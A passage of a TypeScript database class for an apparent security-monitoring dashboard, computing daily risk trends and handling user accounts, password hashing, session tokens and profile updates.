        day: d.toLocaleDateString('en-US', { weekday: 'short' }),
        timestamp: d.toISOString(),
        riskScore,
        blockedCalls: blockedCallsCount,
        allowedCalls: allowedCallsCount,
        totalCalls: totalCallsCount,
        blockRatePercentage: totalCallsCount > 0 ? Math.round((blockedCallsCount / totalCallsCount) * 100) : 0,
      });
    }

    // Today (Day 0) - dynamically bound to live event log
    const todayPrefix = now.toISOString().slice(0, 10);
    const todayEvents = this.data.events.filter((e) => e.timestamp.startsWith(todayPrefix));
    const todayBlocked = todayEvents.length > 0
      ? todayEvents.filter((e) => e.decision === 'BLOCK').length
      : blockedCalls;
    const todayAllowed = todayEvents.length > 0
      ? todayEvents.filter((e) => e.decision === 'ALLOW').length
      : allowedCalls;
    const todayTotal = todayBlocked + todayAllowed;
    const todayRisk = todayEvents.length > 0
      ? Math.round(todayEvents.reduce((acc, e) => acc + (riskScores[e.riskLevel] || 20), 0) / todayEvents.length)
      : Math.max(18, avgRisk);

    dailyRiskTrend.push({
      date: now.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }),
      day: 'Today',
      timestamp: now.toISOString(),
      riskScore: todayRisk,
      blockedCalls: todayBlocked,
      allowedCalls: todayAllowed,
      totalCalls: todayTotal > 0 ? todayTotal : totalCalls,
      blockRatePercentage: todayTotal > 0 ? Math.round((todayBlocked / todayTotal) * 100) : blockRatePercentage,
    });

    return {
      totalCalls,
      allowedCalls,
      blockedCalls,
      blockRatePercentage,
      activeAlerts,
      averageRiskScore: avgRisk,
      ruleBreakdown,
      hourlyActivity,
      dailyRiskTrend,
      recentIncidents: this.data.events.slice(0, 8),
    };
  }

  // --- Authentication & User Profile Layer ---
  public toUserProfile(record: UserRecord): UserProfile {
    const managedAgentCount = Object.values(this.data.agents).length;
    return {
      id: record.id,
      email: record.email,
      name: record.name,
      role: record.role,
      avatarUrl: record.avatarUrl,
      department: record.department,
      organization: record.organization,
      createdAt: record.createdAt,
      lastLoginAt: record.lastLoginAt,
      managedAgentCount,
      preferences: { ...record.preferences },
    };
  }

  public getUserByEmail(email: string): UserRecord | null {
    const normalized = email.toLowerCase().trim();
    const found = Object.values(this.data.users).find(
      (u) => u.email.toLowerCase().trim() === normalized
    );
    return found || null;
  }

  public getUserById(id: string): UserProfile | null {
    const record = this.data.users[id];
    if (!record) return null;
    return this.toUserProfile(record);
  }

  public createUser(params: {
    email: string;
    password: string;
    name: string;
    role?: UserRole;
    department?: string;
    organization?: string;
    avatarUrl?: string;
  }): { user: UserProfile; token: string } {
    const normalized = params.email.toLowerCase().trim();
    if (this.getUserByEmail(normalized)) {
      throw new Error(`User with email "${normalized}" already exists.`);
    }

    const salt = crypto.randomBytes(16).toString('hex');
    const passwordHash = hashPassword(params.password, salt);
    const userId = `user-${Date.now().toString(36)}-${crypto.randomBytes(3).toString('hex')}`;
    const avatar =
      params.avatarUrl ||
      `https://api.dicebear.com/7.x/bottts/svg?seed=${encodeURIComponent(params.name)}&backgroundColor=b6e3f4,c0aede,d1d4f9,ffd5dc,ffdfbf`;

    const userRecord: UserRecord = {
      id: userId,
      email: normalized,
      passwordHash,
      salt,
      name: params.name.trim(),
      role: params.role || 'SecOps Analyst',
      avatarUrl: avatar,
      department: params.department || 'Security Intelligence',
      organization: params.organization || 'SentinelMesh Enterprise',
      createdAt: new Date().toISOString(),
      lastLoginAt: new Date().toISOString(),
      preferences: {
        themeAccent: 'violet',
        enableAudioCues: true,
        reducedMotion: false,
        emailAlerts: true,
        compactAuditLogs: false,
        gatewayNotifications: true,
      },
    };

    this.data.users[userId] = userRecord;

    // Issue session token
    const token = `sm_sess_${crypto.randomBytes(24).toString('hex')}`;
    const expiresAt = new Date(Date.now() + 1000 * 60 * 60 * 24 * 7).toISOString(); // 7 days
    this.data.sessions[token] = {
      token,
      userId,
      createdAt: new Date().toISOString(),
      expiresAt,
    };

    this.saveToDisk();
    return {
      user: this.toUserProfile(userRecord),
      token,
    };
  }

  public authenticateUser(
    email: string,
    password: string
  ): { user: UserProfile; token: string } | null {
    const userRecord = this.getUserByEmail(email);
    if (!userRecord) return null;

    const computedHash = hashPassword(password, userRecord.salt);
    if (computedHash !== userRecord.passwordHash) {
      return null;
    }

    // Update lastLoginAt
    userRecord.lastLoginAt = new Date().toISOString();
    this.data.users[userRecord.id] = userRecord;

    // Create session
    const token = `sm_sess_${crypto.randomBytes(24).toString('hex')}`;
    const expiresAt = new Date(Date.now() + 1000 * 60 * 60 * 24 * 7).toISOString();
    this.data.sessions[token] = {
      token,
      userId: userRecord.id,
      createdAt: new Date().toISOString(),
      expiresAt,
    };

    this.saveToDisk();
    return {
      user: this.toUserProfile(userRecord),
      token,
    };
  }

  public verifySessionToken(token: string): UserProfile | null {
    if (!token) return null;
    const session = this.data.sessions[token];
    if (!session) return null;

    // Check expiration
    if (new Date(session.expiresAt).getTime() < Date.now()) {
      delete this.data.sessions[token];
      this.saveToDisk();
      return null;
    }

    const userRecord = this.data.users[session.userId];
    if (!userRecord) {
      delete this.data.sessions[token];
      this.saveToDisk();
      return null;
    }

    return this.toUserProfile(userRecord);
  }

  public destroySession(token: string): boolean {
    if (!token) return false;
    if (this.data.sessions[token]) {
      delete this.data.sessions[token];
      this.saveToDisk();
      return true;
    }
    return false;
  }

  public updateUserProfile(
    userId: string,
    patch: Partial<UserProfile>
  ): UserProfile | null {
    const record = this.data.users[userId];
    if (!record) return null;

    if (patch.name) record.name = patch.name.trim();
    if (patch.department) record.department = patch.department.trim();
    if (patch.organization) record.organization = patch.organization.trim();
    if (patch.avatarUrl) record.avatarUrl = patch.avatarUrl.trim();
    if (patch.role) record.role = patch.role;
    if (patch.preferences) {
      record.preferences = {
        ...record.preferences,
        ...patch.preferences,
      };
    }

    this.data.users[userId] = record;
    this.saveToDisk();
    return this.toUserProfile(record);
  }

  public resetPassword(email: string, newPassword: string): boolean {
    const record = this.getUserByEmail(email);
    if (!record) return false;

    const salt = crypto.randomBytes(16).toString('hex');
    record.salt = salt;
    record.passwordHash = hashPassword(newPassword, salt);
    this.data.users[record.id] = record;
    this.saveToDisk();
    return true;
  }

  public getAllUsers(): UserProfile[] {
    return Object.values(this.data.users).map((u) => this.toUserProfile(u));
  }
}

export const db = new PersistentDatabase();

